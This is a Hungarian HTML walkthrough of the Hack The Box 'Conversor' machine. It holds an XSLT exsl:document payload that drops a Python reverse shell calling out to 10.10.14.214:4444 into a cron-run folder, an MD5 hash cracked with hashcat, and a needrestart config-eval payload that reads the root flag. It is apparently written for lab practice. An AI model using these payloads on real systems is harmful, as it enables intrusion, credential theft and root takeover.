@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang='hu'>
+<head>
+    <meta charset='UTF-8'>
+    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
+    <title>HTB Conversor - Walkthrough</title>
+    <style>
+        body { font-family: 'Segoe UI', Arial, sans-serif; line-height: 1.6; background-color: #f4f4f9; color: #333; max-width: 1000px; margin: 0 auto; padding: 20px; }
+        .container { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 5px 25px rgba(0,0,0,0.1); }
+        h1 { text-align: center; color: #343a40; border-bottom: 4px solid #007bff; padding-bottom: 10px; margin-bottom: 30px; }
+        h2 { color: #007bff; margin-top: 30px; padding-bottom: 5px; border-bottom: 2px solid #eee; }
+        .section { margin-bottom: 40px; }
+        .tag { display: inline-block; padding: 4px 10px; border-radius: 4px; font-weight: bold; font-size: 0.85em; margin-bottom: 10px; color: white; }
+        .tag-success { background-color: #28a745; }
+        .tag-failure { background-color: #dc3545; }
+        .tag-info { background-color: #17a2b8; }
+        pre { background: #282a36; color: #f8f8f2; padding: 20px; border-radius: 8px; overflow-x: auto; font-family: 'Consolas', monospace; position: relative; margin: 20px 0; }
+        code { font-family: 'Consolas', monospace; color: #e83e8c; background: #f8f9fa; padding: 2px 4px; border-radius: 4px; }
+        ul { padding-left: 20px; }
+        li { margin-bottom: 8px; }
+        .footer { text-align: center; margin-top: 40px; color: #888; font-size: 0.9em; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>HTB Conversor - Walkthrough</h1>
+
+        <div class="section">
+            <p>A Conversor egy Flask alapú webalkalmazás volt, amely XSLT injekció sebezhetőséget tartalmazott. Az <code>exsl:document</code> kiterjesztés tetszőleges fájlírást tett lehetővé, amit egy cron job-bal párosítva initial access-hez vezetett. A privilege escalation során egy sudoers bejegyzés biztosított utat a root jogosultsághoz.</p>
+        </div>
+
+        <div class="section">
+            <h2>1. Felderítés</h2>
+            <span class="tag tag-info">INFORMÁCIÓ</span>
+            <p>Az nmap scan két nyitott portot mutatott: SSH-t a 22-n és HTTP-t a 80-on. A weboldal egy XML/XSLT konvertáló szolgáltatás volt Flask-ben. Az <code>/about</code> oldalon publikálták a teljes forráskódot (<code>source_code.tar.gz</code>), ami white-box tesztelést tett lehetővé.</p>
+
+            <pre><code># nmap -sC -sV conversor.htb
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu
+80/tcp open  http    Apache httpd 2.4.52</code></pre>
+        </div>
+
+        <div class="section">
+            <h2>2. Initial Access</h2>
+            <span class="tag tag-success">SIKER</span>
+            <p>A forráskód elemzése során kiderült, hogy a rendszer <code>libxslt</code>-t használ, és nincs letiltva az <code>exsl:document</code> kiterjesztés. Ez azt jelentette, hogy XSLT templateken keresztül tetszőleges fájlokat lehet írni a szerverre.</p>
+
+            <p>Az <code>install.md</code> alapján egy cron job percenként futtatja a <code>/var/www/conversor.htb/scripts/</code> mappában található Python fájlokat <code>www-data</code> jogosultsággal:</p>
+
+            <pre><code>* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done</code></pre>
+
+            <p>Kombináltam a két vektort: XSLT-vel írtam egy reverse shell-t a scripts mappába, majd vártam, hogy a cron lefuttassa.</p>
+
+            <h3>XSLT Payload</h3>
+            <pre><code>&lt;xsl:stylesheet version="1.0"
+    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+    xmlns:exsl="http://exslt.org/common"
+    extension-element-prefixes="exsl"&gt;
+    &lt;xsl:template match="/"&gt;
+        &lt;exsl:document href="/var/www/conversor.htb/scripts/exploit.py" method="text"&gt;
+import socket,os,pty
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("10.10.14.214",4444))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+pty.spawn("/bin/bash")
+        &lt;/exsl:document&gt;
+    &lt;/xsl:template&gt;
+&lt;/xsl:stylesheet&gt;</code></pre>
+
+            <p>Kb. egy perc várakozás után megérkezett a shell <code>www-data</code> jogosultsággal.</p>
+        </div>
+
+        <div class="section">
+            <h2>3. Sikertelen megközelítések</h2>
+            <span class="tag tag-failure">ZSÁKUTCA</span>
+            <p>Mielőtt a működő exploit útvonalra bukkantam volna, több irányból próbálkoztam:</p>
+            <ul>
+                <li><strong>XXE fájl olvasás:</strong> Az XML entitások működtek, de a <code>/view</code> endpoint nem reflektálta a tartalmakat, csak előnézetet renderelt.</li>
+                <li><strong>PHP webshell:</strong> A static könyvtárba próbáltam PHP fájlokat írni, de az Apache nem értelmezi PHP-ként a statikus tartalmakat.</li>
+                <li><strong>XSLT PHP függvények:</strong> A <code>php:function</code> namespace nincs engedélyezve a libxslt-ben.</li>
+            </ul>
+            <p>Ezek után fordítottam figyelmet az <code>exsl:document</code> és a cron job kombinációjára.</p>
+        </div>
+
+        <div class="section">
+            <h2>4. User Flag</h2>
+            <span class="tag tag-success">SIKER</span>
+            <p>A <code>www-data</code> shell-lel hozzáfértem a Flask alkalmazás SQLite adatbázisához (<code>/var/www/conversor.htb/instance/users.db</code>). Az adatbázisban egy felhasználói hash volt:</p>
+
+            <pre><code>fismathack:5b5c3ac3a1c897c94caad48e6c71f**c</code></pre>
+
+            <p>MD5 hash, amit hashcat-tel törtem fel a rockyou szótár alapján:</p>
+
+            <pre><code>$ hashcat -m 0 hash.txt rockyou.txt
+5b5c3ac3a1c897c94caad48e6c71f**c:Keepmesafeandw**m</code></pre>
+
+            <p>SSH-n beléptem a <code>fismathack</code> accountba, és megszereztem a user flaget.</p>
+
+            <pre><code>585c0dfa9bb3a20d524643300cc5b1**</code></pre>
+        </div>
+
+        <div class="section">
+            <h2>5. Privilege Escalation</h2>
+            <span class="tag tag-success">SIKER</span>
+            <p>A <code>sudo -l</code> parancs érdekes eredményt adott:</p>
+
+            <pre><code>User fismathack may run the following commands on conversor:
+    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart</code></pre>
+
+            <p>A <code>needrestart</code> egy Perl-ben írt utility, ami újraindítandó szolgáltatásokat detektál. Van egy <code>-c</code> kapcsolója, amivel egyedi konfigurációs fájlt lehet betölteni. A forráskód alapján ez a config fájl Perl kódként kerül értelmezésre <code>eval</code>-lal.</p>
+
+            <p>Készítettem egy Perl payloadot, ami a root flag tartalmát egy die üzenetben jelenítette meg:</p>
+
+            <pre><code>$ cat exploit.conf
+die "DEBUG: " . `cat /root/root.txt`;
+
+$ sudo /usr/sbin/needrestart -c exploit.conf</code></pre>
+
+            <p>A script elszállt a die miatt, de a standard error kiírta a root flaget:</p>
+
+            <pre><code>a98902419c02ec72e3dcd059b507a3**</code></pre>
+
+            <p>Természetesen ugyanígy lehetett volna teljes root shell-t is nyitni, de a flag megszerzése volt a cél.</p>
+        </div>
+
+        <div class="footer">
+            <p>HTB Conversor | 2025. december 25.</p>
+        </div>
+    </div>
+</body>
+</html>
